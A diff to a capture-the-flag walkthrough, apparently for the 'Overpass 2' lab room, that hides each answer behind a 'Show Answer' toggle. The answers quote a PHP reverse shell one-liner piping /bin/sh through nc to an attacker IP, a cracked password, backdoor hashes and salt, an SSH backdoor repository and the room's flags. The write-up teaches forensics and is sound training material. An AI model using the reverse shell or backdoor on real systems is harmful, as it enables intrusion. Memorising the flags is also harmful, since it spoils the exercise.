@@ -11,8 +11,6 @@ Note: Although this room is a walkthrough, it expects familiarity with tools and
 
 md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc
 ```
-![Download Task File](Assets/Task_Files/overpass2.pcapng "Download Task File")
-
 
 ## Question 1:
 #### What was the URL of the page they used to upload a reverse shell?
@@ -29,7 +27,7 @@ Looking further along the same HTTP stream found in the previous answer, the pay
 
 ![](Assets/Images/Pasted%20image%2020221207121421.png)
 
-##### Answer: `?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?`
+##### Answer: <details> <summary>Show Answer</summary> `?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?` </details> 
 
 ## Question 3: 
 #### What password did the attacker use to privesc?
@@ -38,7 +36,7 @@ Using the Wireshark filter is really handy for finding specific keywords contain
 
 ![](Assets/Images/Pasted%20image%2020221207122714.png)
 
-##### Answer: `whenevernoteartinstant`
+##### Answer: <details> <summary>Show Answer</summary> `whenevernoteartinstant` </details>
 
 ## Question 4: 
 #### How did the attacker establish persistence?
@@ -46,7 +44,7 @@ Using the Wireshark filter is really handy for finding specific keywords contain
 Looking further down the same stream we can see the attacker is using a ssh-backdoor payload which they cloned using the `git clone` command and saved it on the machine. 
 They then utilized `ssh-keygen` to generate their own public/private rsa key pair and saved the key in `/home/james/.ssh/id_rsa` thus allowing the attacker to connect to the machine using SSH.
 
-##### Answer: `https://github.com/NinjaJc01/ssh-backdoor`
+##### Answer: <details> <summary>Show Answer</summary> `https://github.com/NinjaJc01/ssh-backdoor` </details>
 
 ## Question 5:
 #### Using the fasttrack wordlist, how many of the system passwords were crackable?
@@ -55,7 +53,7 @@ We can see the attacker used `sudo cat /etc/shadow` to view the password hash fo
 
 ![](Assets/Images/Pasted%20image%2020221207124926.png)
 
-##### Answer: `4`
+##### Answer: <details> <summary>Show Answer</summary> `4` </details>
 
 # Task 2: Research - Analyse the code
 
@@ -66,21 +64,21 @@ Now that you've found the code for the backdoor, it's time to analyse it.
 
 The answer to this question can be found by investigating the code found in `ssh-backdoor/main.go`. An easy way to view this is by visiting the github account mentioned earlier and viewing the code directly from the repository. 
 
-##### Answer: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`
+##### Answer: <details> <summary>Show Answer</summary> `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` </details>
 
 ## Question 2:
 #### What's the hardcoded salt for the backdoor?
 
 The hardcoded salt for the backdoor was defined in line `108` in the same script mentioned above.
 
-##### Answer: `1c362db832f3f864c8c2fe05f2002a05`
+##### Answer: <details> <summary>Show Answer</summary> `1c362db832f3f864c8c2fe05f2002a05` </details>
 
 ## Question 3:
 #### What was the hash that the attacker used? - go back to the PCAP for this!
 
 Found using the same stream as earlier.
 
-##### Answer: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
+##### Answer: <details> <summary>Show Answer</summary> `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` </details>
 
 ## Question 4:
 #### Crack the hash using rockyou and a cracking tool of your choice. What's the password?
@@ -99,7 +97,7 @@ In this case, my choice of tool was hashcat using the following command:
 
 ![](Assets/Images/Pasted%20image%2020221207150313.png)
 
-##### Answer: `november16`
+##### Answer: <details> <summary>Show Answer</summary> `november16` </details>
 
 # Task 3:  Attack - Get back in!
 
@@ -114,13 +112,13 @@ There's flags on the box that Overpass can't afford to lose by formatting the se
 ![](Assets/Images/Pasted%20image%2020221207150823.png)
 
 
-##### Answer: `H4ck3d by CooctusClan`
+##### Answer: <details> <summary>Show Answer</summary> `H4ck3d by CooctusClan` </details>
 
 ## Question 2:
 #### Using the information you've found previously, hack your way back in!
 
 
-##### Answer: `No answer needed`
+##### Answer: <details> <summary>Show Answer</summary> `No answer needed` </details>
 
 ## Question 3:
 #### What's the user flag?
@@ -135,8 +133,7 @@ So in order to connect to the machine using SSH, we need to specify the port num
 
 From here its fairly easy to get the user flag as the `user.txt` file is located on directory up from our current working directory.
 
-##### Answer: `thm{d119b4fa8c497ddb0525f7ad200e6567}
-`
+##### Answer: <details> <summary>Show Answer</summary> `thm{d119b4fa8c497ddb0525f7ad200e6567}` </details>
 
 ## Question 4:
 #### What's the root flag?
@@ -154,7 +151,7 @@ As per gtfobins, we need to do now is execute the binary using the following com
 No we we can capture our final flag!
 Flag is located in `/root/root.txt`
 
-##### Answer: `thm{d53b2684f169360bb9606c333873144d}`
+##### Answer: <details> <summary>Show Answer</summary> `thm{d53b2684f169360bb9606c333873144d}` </details>
 
 ## Conclusion
 
